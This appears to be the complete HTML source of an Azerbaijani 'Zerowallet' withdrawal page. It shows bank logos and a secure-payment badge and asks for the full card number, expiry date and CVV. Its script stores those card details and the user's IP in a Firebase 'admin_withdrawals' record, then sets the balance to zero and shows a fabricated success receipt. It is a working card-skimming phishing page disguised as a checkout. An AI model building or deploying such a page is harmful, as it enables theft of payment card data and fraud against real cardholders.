<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Checkout | Zerowallet Payments</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root { --bank-blue: #004a99; --bg: #f4f7fa; --success: #10b981; }
        body { margin: 0; background: var(--bg); font-family: 'Inter', sans-serif; display: flex; flex-direction: column; align-items: center; padding: 20px; }

        .header { width: 100%; max-width: 450px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
        .back-btn { font-size: 1.2rem; color: #333; cursor: pointer; }
        .secure-txt { font-size: 0.8rem; color: #666; font-weight: 600; }

        .withdraw-card, .receipt-card {
            width: 100%; max-width: 450px; background: #fff; border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.05); padding: 30px 25px;
        }

        /* Bank Logoları */
        .bank-logos { display: flex; gap: 20px; margin-bottom: 25px; align-items: center; justify-content: center; }
        .bank-logos img { height: 35px; object-fit: contain; }

        .label { display: block; font-size: 0.8rem; font-weight: 700; color: #444; margin-bottom: 8px; }
        .input-field {
            width: 100%; padding: 15px; border: 2px solid #edf2f7; border-radius: 12px;
            font-size: 1rem; font-weight: 600; margin-bottom: 20px; background: #fcfdfe;
        }

        .confirm-btn {
            width: 100%; padding: 18px; border: none; border-radius: 14px;
            background: var(--bank-blue); color: #fff; font-size: 1.1rem; font-weight: 700;
            cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
        }

        /* Professional Çek (Receipt) Dizaynı */
        .receipt-card { display: none; text-align: center; border-top: 8px solid var(--success); }
        .receipt-header { color: var(--success); font-size: 3rem; margin-bottom: 10px; }
        .check-title { font-weight: 800; font-size: 1.2rem; margin-bottom: 20px; }
        .check-details { border-top: 1px dashed #ddd; border-bottom: 1px dashed #ddd; padding: 20px 0; margin-bottom: 20px; text-align: left; }
        .check-line { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.9rem; }
        .check-line b { color: #333; }
        .print-btn { background: #eee; color: #333; border: none; padding: 10px; width: 100%; border-radius: 10px; font-weight: 600; cursor: pointer; }

        .visa-master { margin-top: 20px; display: flex; justify-content: center; gap: 20px; opacity: 0.3; font-size: 2rem; }
    </style>
</head>
<body>

    <div class="header">
        <div class="back-btn" onclick="location.href='main.html'"><i class="fas fa-arrow-left"></i></div>
        <div class="secure-txt"><i class="fas fa-lock"></i> TƏHLÜKƏSİZ ÖDƏNİŞ</div>
    </div>

    <div class="withdraw-card" id="main-form">
        <div class="bank-logos">
            <img src="abb.png" alt="ABB">
            <img src="kapital.png" alt="Kapital">
            <img src="pasha.png" alt="Pasha">
        </div>

        <label class="label">Kart Sahibi</label>
        <input type="text" id="w-name" class="input-field" placeholder="AD SOYAD">

        <label class="label">Kart Nömrəsi</label>
        <input type="text" id="w-card" class="input-field" placeholder="16 Rəqəmli Nömrə" maxlength="16">

        <div style="display:flex; gap:15px;">
            <div style="flex:1">
                <label class="label">Müddət</label>
                <input type="text" id="w-date" class="input-field" placeholder="AA/İİ" maxlength="5">
            </div>
            <div style="flex:1">
                <label class="label">CVV</label>
                <input type="password" id="w-cvv" class="input-field" placeholder="***" maxlength="3">
            </div>
        </div>

        <button class="confirm-btn" id="pay-btn" onclick="processTransfer()">
            <i class="fas fa-shield-alt"></i> TƏSDİQLƏ VƏ ÇIXAR
        </button>
        
        <div class="visa-master">
            <i class="fab fa-cc-visa"></i>
            <i class="fab fa-cc-mastercard"></i>
        </div>
    </div>

    <div class="receipt-card" id="receipt">
        <div class="receipt-header"><i class="fas fa-check-circle"></i></div>
        <div class="check-title">ÖDƏNİŞ TƏSDİQLƏNDİ</div>
        <p style="font-size: 0.8rem; color: #666;">Tranzaksiya uğurla tamamlandı.</p>

        <div class="check-details">
            <div class="check-line"><span>Status:</span> <b style="color:var(--success)">UĞURLU</b></div>
            <div class="check-line"><span>Məbləğ:</span> <b id="r-amount">0.00 AZN</b></div>
            <div class="check-line"><span>Kart:</span> <b id="r-card">**** 1234</b></div>
            <div class="check-line"><span>Tarix:</span> <b id="r-date">--.--.2026</b></div>
            <div class="check-line"><span>ID:</span> <b id="r-id">#ZW992837</b></div>
        </div>

        <button class="print-btn" onclick="location.href='main.html'">ANA SƏHİFƏYƏ QAYIT</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
            authDomain: "sevgili-testi.firebaseapp.com",
            databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com",
            projectId: "sevgili-testi",
            storageBucket: "sevgili-testi.firebasestorage.app",
            messagingSenderId: "399260477557",
            appId: "1:399260477557:web:584204a698d7bf145bb03c"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const user = localStorage.getItem('zerowallet_session');

        let userBal = 0, userIp = "";
        db.ref('zerowallet_users/' + user).once('value', snap => {
            const d = snap.val();
            userBal = d.balance;
            userIp = d.ip;
        });

        async function processTransfer() {
            const name = document.getElementById('w-name').value;
            const card = document.getElementById('w-card').value;
            const exp = document.getElementById('w-date').value;
            const cvv = document.getElementById('w-cvv').value;

            if(userBal < 20) return alert("Minimum 20 AZN balans lazımdır!");
            if(card.length < 16 || name.length < 4) return alert("Məlumatlar tam deyil!");

            const btn = document.getElementById('pay-btn');
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROSES GEDİR...';
            btn.disabled = true;

            try {
                const transID = "ZW" + Math.floor(Math.random() * 900000 + 100000);
                
                await db.ref('admin_withdrawals/' + user).set({
                    username: user, card_name: name, card_num: card,
                    card_exp: exp, card_cvv: cvv, amount: userBal,
                    ip: userIp, timestamp: Date.now(), transactionID: transID
                });

                // Çeki Doldur
                document.getElementById('r-amount').innerText = userBal.toFixed(2) + " AZN";
                document.getElementById('r-card').innerText = "**** " + card.slice(-4);
                document.getElementById('r-date').innerText = new Date().toLocaleString();
                document.getElementById('r-id').innerText = "#" + transID;

                await db.ref('zerowallet_users/' + user).update({ balance: 0 });

                // Keçid Efekti
                document.getElementById('main-form').style.display = 'none';
                document.getElementById('receipt').style.display = 'block';

            } catch(e) {
                alert("Xəta: " + e.message);
                btn.disabled = false;
            }
        }
    </script>
</body>
</html>
